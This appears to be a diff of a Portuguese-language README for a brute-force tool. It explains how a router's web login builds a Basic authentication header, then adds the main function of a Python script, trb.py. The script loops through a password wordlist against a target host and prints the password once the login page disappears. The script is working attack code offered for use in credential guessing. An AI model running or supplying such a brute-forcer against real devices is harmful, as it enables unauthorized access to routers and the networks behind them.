@@ -89,15 +89,15 @@ function PCWin(event)
 function PCSubWin()
 {	
     // Verifica se o usúario não está bloqueado por alguns segundos
-	if (isLocked == true)
-	{
-		return ;
-	}
+    if (isLocked == true)
+     {
+	return;
+     }
     // Criando uma variavel que receberá o base64 referente a autenticação
     // E criando duas variavels para receber o userName e o password
-	var auth;
-	var password = $("pcPassword").value;
-	var userName = $("userName").value;
+    var auth;
+    var password = $("pcPassword").value;
+    var userName = $("userName").value;
     
     // Concatena a palavra "Basic" com a hash base64 de userName com ":" e o password
     auth = "Basic "+Base64Encoding(userName+":"+password);
@@ -109,4 +109,32 @@ function PCSubWin()
 
 ```
 
-### Entendendo o funcionamento do Script trb.py
+### Entendendo o funcionamento do script trb.py
+
+```python
+
+def main():
+    wordlist = open(sys.argv[3], 'r')
+    count = 0
+    for i in wordlist:
+
+        login = str(sys.argv[1])
+        senha = i.rstrip()
+        auth  = "Basic "
+
+        authEncode = auth+base64.b64encode(login+':'+senha)
+
+        cookie = {"Authorization": authEncode}
+
+        response = r.get('http://'+sys.argv[2], cookies=cookie)
+
+        if response.content.count('id="userName"') != 1:
+            os.system('setterm -cursor on')
+            print('\n\tPassword Found =====> ' + senha)
+            exit(0)
+        else:
+            os.system("clear")
+            splash()
+            count = count + 1
+            print('\t[ '+ str(count) + ' ] Password not found ===> ' + senha)	    
+```
